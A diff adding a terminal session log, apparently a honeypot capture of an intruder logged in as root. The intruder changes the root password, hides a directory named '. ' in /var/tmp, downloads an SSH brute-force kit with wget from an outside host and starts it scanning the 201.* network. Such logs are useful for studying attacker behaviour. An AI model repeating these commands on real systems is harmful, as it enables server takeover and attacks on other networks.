@@ -1,0 +1,87 @@
+[4hAWSWeb:~# s[1D[1Pw
+[4l 17:03:04 up 72 days, 19:6,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    17:02    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# w
+[4l 17:03:19 up 72 days, 19:7,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    17:02    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# cd
+[4l[4hAWSWeb:~# cd /var/tmp
+[4l[4hAWSWeb:/var/tmp# ls
+[4l[4hAWSWeb:/var/tmp# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:/var/tmp# cd /vart[1D[1P/tmn[1D[1Pp
+[4l[4hAWSWeb:/var/tmp# ls
+[4l[4hAWSWeb:/var/tmp# cd ". "
+[4lbash: cd: . : No such file or directory
+[4hAWSWeb:/var/tmp# ls
+[4l[4hAWSWeb:/var/tmp# ls -a
+[4l.  .. 
+[4hAWSWeb:/var/tmp# cd ". "
+[4lbash: cd: . : No such file or directory
+[4hAWSWeb:/var/tmp# mkdir ". "
+[4l[4hAWSWeb:/var/tmp# wget http://rapk1d.webs.com/100mb.tgz
+[4l--2013-04-07 17:03:54--  http://rapk1d.webs.com/100mb.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 595836 (581K) [application/octet-stream]
+Saving to: `100mb.tgz
+
+ 0% [>                                      ] 3,888        33K/s  eta 17s100%[======================================>] 595,836      33K/s
+
+2013-04-07 17:03:55 (33 KB/s) - `100mb.tgz' saved [595836/595836]
+[4hAWSWeb:/var/tmp# ls
+[4l100mb.tgz 
+[4hAWSWeb:/var/tmp# tar zxvf 100mb.tgz
+[4lgosh
+gosh/ss
+gosh/clean
+gosh/ssh-scan
+gosh/nohup.out
+gosh/pass_file
+gosh/vuln
+gosh/go.sh
+gosh/dedi
+[4hAWSWeb:/var/tmp# rm -rf 1009[1D[1Pmn[1D[1Pb.tgz
+[4l[4hAWSWeb:/var/tmp# ls
+[4lgosh 
+[4hAWSWeb:/var/tmp# cd gosh
+[4l[4hAWSWeb:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hAWSWeb:/var/tmp/gosh# chmod +x *
+[4l[4hAWSWeb:/var/tmp/gosh# ./go.sh 201
+[4lscanning network 201.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hAWSWeb:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hAWSWeb:/var/tmp/gosh# w
+[4l 17:04:50 up 72 days, 19:8,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    17:02    0.09   0.05   0.05 w
+[4hAWSWeb:/var/tmp/gosh# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hAWSWeb:/var/tmp/gosh# w
+[4l 17:04:54 up 72 days, 19:8,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    17:02    0.09   0.05   0.05 w
+[4hAWSWeb:/var/tmp/gosh# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
